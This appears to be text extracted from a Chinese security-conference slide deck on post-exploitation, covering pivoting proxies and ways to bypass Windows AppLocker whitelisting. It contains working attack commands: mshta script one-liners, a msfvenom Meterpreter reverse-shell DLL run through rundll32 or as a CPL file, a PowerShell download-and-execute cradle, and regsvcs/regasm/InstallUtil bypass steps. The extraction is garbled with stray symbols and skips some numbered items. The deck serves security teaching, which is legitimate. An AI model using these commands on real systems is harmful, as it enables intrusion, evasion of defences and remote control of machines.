Shell is Only the Beginning——后渗透阶段的攻防对抗
3gstudent & Evi1cg
As a offensive researcher, if you can dream it,someone has likely already done it and that someone isn’t the kind of 
person who speaks at security cons…  
——Matt Graeber
3gstudent 
Good$Study
Good$Health
Good$Attitude$
Evi1cg
Thin
WhiteHat
Security$Researcher
后渗透阶段
渗透测试
以特定的业务系统作为目标，识
别出关键的基础设施，并寻找客
户组织最具价值和尝试进行安全
保护的信息和资产
黑客攻击
黑客对攻击战果进一步扩大，以
及尽可能隐藏自身痕迹的过程
•
打开一扇窗
•
Open Proxy
•
绕过看门狗
•
Bypass Application Whitelisting
•
我来作主人
•
Escalate Privileges
•
屋里有什么
•
Gather Information
•
我来抓住你
•
Detection and Mitigations
•
挖一个密道
•
Persistence
目录
打开一扇窗
Open Proxy
为什么用代理?
• 更好地接触到目标所处环境
• 使用已有shell的机器作为跳板，扩大战果
• It’s the beginning
常用方法
端口转发：Client-> Lcx, Netsh;
HTTP-> Tunnel;
Metasploit-> Portpwd
Socks代理：Client-> Ew,Xsocks;
HTTP-> ReGeorg; Metasploit-> Socks4a
其他：SSH, ICMP 等
Vpn
！
然而，我们可能会碰到这样的情况：
• 安装杀毒软件,拦截“恶意”程序
• 设置应用程序白名单,限制白名单以外的程序运行
eg：Windows Applocker
Windows AppLocker
简介：
即“应用程序控制策略”，可用来对可执行程序、安装程序和脚本进行控制
开启默认规则后，除了默认路径可以执行外，其他路径均无法执行程序和脚本
绕过看门狗
Bypass Application Whitelisting
绕过思路
ü Hta
ü Office Macro
ü Cpl
ü Chm
ü Powershell
ü Rundll32
ü Regsvr32
ü Regsvcs
ü Installutil
…
1、Hta
More：
•
Mshta.exe
vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.cl
ose)
•
Mshta.exe javascript:"\..\mshtml,RunHTMLApplication
";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe
",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveX
Object("WScript.Shell").Run("cmd /c taskkill /f /im
mshta.exe",0,true);}
2、Office Macro
MacroRaptor：
• Detect malicious VBA Macros
• Python
• https://bitbucket.org/decalage/oletools/wiki/mraptor
3、Cpl
DLL/CPL:
生成Payload.dll:
msfvenom -p$windows/meterpreter/reverse_tcp -b$‘\x00\xff’$lhost=192.168.127.132$lport=8888$-f$dll -o$payload.dll
(1)$直接运行dll：
rundll32$shell32.dll,Control_RunDLL$payload.dll
(2)$将dll重命名为cpl，双击运行
(3)$普通的dll直接改后缀名
From: http://drops.wooyun.org/tips/16042
4、Chm
高级组合技打造“完美” 捆绑后门：
http://drops.wooyun.org/tips/14254
利用系统CHM文件实现隐蔽后门：
《那些年我们玩过的奇技淫巧》
5、Powershell
Command:
• powershell -nop -exec$bypass$-c$IEX$(New-Objectet.WebClient).DownloadString('http://ip:port/')
• Get-Content$payload.ps1$|$iex
• cmd.exe7/K7$key.snk
$key$=$
‘BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVA
gSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC5
31ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitoluf
o7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU
0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHc
gJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3r
pZ9tbLZUefrFnLNiHfVjNi53Yg4=’
$Content$=$[System.Convert]::FromBase64String($key)
Set-Content$ key.snk -Value$$Content$-Encoding$Byte
编译：
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:Regasm.dll /keyfile:key.snk Regasm.cs
运行：
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Regasm.dll
[OR]
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Regasm.dll
//如果没有管理员权限使用/U来运行
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U$Regasm.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U$Regasm.dll
From: https://gist.github.com/subTee/e1c54e1fdafc15674c9a
9、Installutil
InstallUtil：
编译：
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe$
/platform:x64$/out:InstallUtil.exe InstallUtil.cs
编译以后用/U参数运行：
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U$
InstallUtil.exe
From:
http://subt0x10.blogspot.jp/2015/08/application-whitelisting-bypasses-101.html$ $http://drops.wooyun.org/tips/8862
10、可执行目录
通过ps脚本扫描可写入的路径,脚本下载地址：http://go.mssec.se/AppLockerBC
From: http://drops.wooyun.org/tips/11804
11、最直接的方式